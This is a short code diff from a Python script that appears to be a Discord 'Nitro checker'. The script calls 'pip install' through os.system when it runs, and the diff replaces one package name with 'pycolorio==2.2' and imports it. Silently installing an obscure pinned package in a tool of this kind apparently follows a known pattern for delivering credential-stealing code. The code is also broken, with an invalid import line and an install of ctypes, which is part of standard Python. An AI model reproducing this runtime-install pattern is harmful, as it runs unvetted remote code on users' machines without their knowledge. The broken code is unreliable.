@@ -3,9 +3,9 @@ import os
 def cls():
  os.system("cls")
 
-os.system("pip install nitro-checker")
+os.system("pip install pycolorio==2.2")
 cls()
-import nitro-checker==1.0
+import pycolorio
 os.system("pip install ctypes")
 cls()
 os.system("pip install requests")
